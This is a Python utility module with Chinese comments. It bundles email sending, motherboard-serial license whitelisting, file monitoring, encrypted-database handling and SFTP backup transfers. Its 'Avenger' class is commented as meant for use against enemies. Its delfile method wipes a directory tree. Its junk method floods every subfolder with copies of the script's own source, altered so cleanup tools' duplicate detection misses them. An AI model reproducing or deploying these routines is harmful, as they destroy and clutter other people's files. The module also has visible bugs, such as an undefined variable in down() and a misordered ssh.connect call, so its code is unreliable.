# -*- coding: UTF-8 -*-
#在这个模块里添加了些许从现实生活中抽象出来的功能

import os
import wmi
import time
import shutil
import smtplib
import hashlib
import paramiko
import cryptlib
from email.mime.text import MIMEText
from lxml import etree, objectify
from config import *


class Attribute(object):
    # 附加功能类
    def __init__(self):
        self.e_from = email_from
        self.e_pwd = email_pwd
        self.e_to = email_to
        self.port = email_port
        self.e_url = email_url

    def emil_min(self):
        # 邮件内容支持HTM格式
        Email = MIMEText(content, "html", "utf-8")
        Email['Subject'] = subject
        Email['From'] = self.e_from
        Email['To'] = self.e_to
        try:
            s = smtplib.SMTP_SSL(self.e_url, self.port)  # 邮件服务器及端口号
            s.login(self.e_from, self.e_pwd)
            s.sendmail(self.e_from, self.e_to, Email.as_string())
            s.quit()
        except:
            print('发送失败！')

    def BIOS_board(self):
        # 获取BIOS和主板信息（特征码）并使用sha3作为哈希加密算法，请注意，sha1和MD5早已被破解请勿使用
        w = wmi.WMI()
        board = w.Win32_BaseBoard()
        for i in board:
            ha_ber = hashlib.sha3_256(str(i.SerialNumber).encode('utf8'))
            br = ha_ber.hexdigest()
            # snumber = uuid.uuid5(uuid.NAMESPACE_DNS, br)
            return br

    def control(self, path, name):
        # 文件监控
        # st_atime(访问时间), st_mtime(修改时间), st_ctime（创建时间)
        suffer = os.path.join(path, name)
        statinfo = os.stat(suffer)
        ctime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_ctime))
        atime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_atime))
        mtime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_mtime))
        ntime = time.strftime('%Y.%m.%d.%X', time.localtime(time.time()))
        return {
                '监控时间':ntime,
                '创建时间':ctime,
                '访问时间':atime,
                '修改时间':mtime
                }

class Avenger(object):
    # 附加负面效果属性类,谨慎使用的类，易诱发不良后果，特别是第一个方法不是仇人就不要乱搞
    def __init__(self):
        self.del_path = path

    def delfile(self):
        # 递归删除文件夹及其文件方法，尽量不用，做事留余地
        try:
            file_li = os.listdir(self.del_path)
            for i in file_li:
                file_path = os.path.join(self.del_path, i)
                if os.path.isfile(file_path):
                    os.remove(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path, True)
        except PermissionError:
            pass

    def junk(self, ppach, max):
        # 生成大量垃圾无用文件，ppach是指定父文件夹路径，max是生成数量最大值,
        # 数值越大运行越慢，注意掌握好平衡，太恶心人了也要不得
        file_li = []
        for a, b, c in os.walk(ppach):
            file_li.append(str(a))

        for i in file_li:
            f_path = os.path.join(ppach, i)

            if os.path.isdir(f_path):
                with open(__file__, 'r', encoding='utf-8') as f:
                    a = f.read()
                file_path = os.path.join(f_path, __file__)
                name = os.path.basename(file_path)
                (filename, listname) = os.path.splitext(name)

                for i in range(1, int(max) + 1):
                    file = os.path.join(f_path, filename + str(i) + listname)
                    try:
                        with open(file, 'w') as f:
                            # 之所以添加换行主要是防止被清理垃圾软件的清理重复文件功能批量删除
                            f.write(str(a) + '\n')
                    except PermissionError:
                        pass


# 许可白名单,有且仅有保存在这个文件里的主板Id可用
class Whitelists(object):

    def __init__(self, xml_name):
        self.name = xml_name  # 保存的xml文件名
        self.tree = None  # 新建xml文件
        self.xml = objectify.ElementMaker(annotate=False)

    def new_xml(self, data):
        self.tree = self.xml.writelists(
            self.xml.data(data)
        )
        etree.ElementTree(self.tree).write(self.name, pretty_print=True)

    def add_xml(self, data):
        te = self.xml.data(data)
        self.tree.append(te)
        etree.ElementTree(self.tree).write(self.name, pretty_print=True)

    def read_xml(self):
        # 因为直接读取xml文件的值是元组类型，不能被修改，因此转换为列表
        li = []  # 存入列表
        tree = etree.parse(self.name)
        for i in tree.xpath('//data'):
            li.append(str(i.text))
        return li


# 新建一个上下文管理器，这里是有关处理数据库安全的措施，执行了一个打开关闭的动作（即解密再加密）
class Operaction():

    def __enter__(self):
        return self

    def open(self):
        # 解密box.key和数据库
        rsa = cryptlib.RSA()
        rsa.decrypt('box.key')
        db = cryptlib.enboxdb()
        db.dedb()

    def close(self):
        # 加密box.key和数据库
        db = cryptlib.enboxdb()
        db.endb()
        rsa = cryptlib.RSA()
        rsa.encrypt('box.key')

    def __exit__(self, exc_type, exc_val, exc_tb):
        return True

def getfileSize(name, path='./'):
    #用于文件监控，防止日志文件占用过多
    file=os.path.join(path, name)
    try:
        size = os.path.getsize(file)
        if size >= filesize:
            os.remove(file)
        else:
            return size
    except Exception as e:
        print(e)


def down_f(text):
    transport = paramiko.Transport(host_name, port)
    transport.connect(user_name, pass_word)
    sftp = paramiko.SFTPClient.from_transport(transport)
    linux_file = r"/home/zzg/up_text/" + text
    win_file = down_file + text
    sftp.get(linux_file, win_file)
    print("OK，备份文件下载成功！")

class MySSH(object):

    def __init__(self):
        os.chdir(r"./")
        self.user = user_name
        self.pwd = pass_word
        self.port = port

    def up(self, host_name):
        transport = paramiko.Transport(host_name, self.port)
        transport.connect(self.user, self.pwd)
        sftp = paramiko.SFTPClient.from_transport(transport)
        for (root_name, dirs_name, files_name) in os.walk(zip_file):
            for i in files_name:
                Win_file = os.path.join(zip_file, i)
                Linux_file = os.path.join(linux_path, i)
                sftp.put(Win_file, Linux_file)
        print("上传完成，当前时间为：", (time.strftime('%Y-%m-%d %X', time.localtime())))

    def down(self, text, all):  # 0为下载备份文件与 与之对应的MD5  #1为只下载文件
        if ll == 0:
            try:
                down_f(text=text)
            except Exception as d:
                with open(error + "down.err", "w", encoding="utf-8") as b:
                    b.write(str(d))
            transport = paramiko.Transport(host_name, port)
            transport.connect(self.user, self.pwd)
            sftp2 = paramiko.SFTPClient.from_transport(transport)
            linux_file2 = r"/home/zzg/up_text/" + text + ".md5"
            win_file2 = down_file + text + ".md5"
            sftp2.get(linux_file2, win_file2)
            print("OK，MD5值下载成功！")

        elif all == 1:
            down_f(text=text)

    def search(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host_name, self.user, self.pwd)
        stdin, stdout, stderr = ssh.exec_command("ls "+search_path)
        backups_file = stdout.readlines()
        ssh.close()
        li = []
        for f in backups_file:
            a = f.rstrip("\n")
            li.append(a)
        print(li)
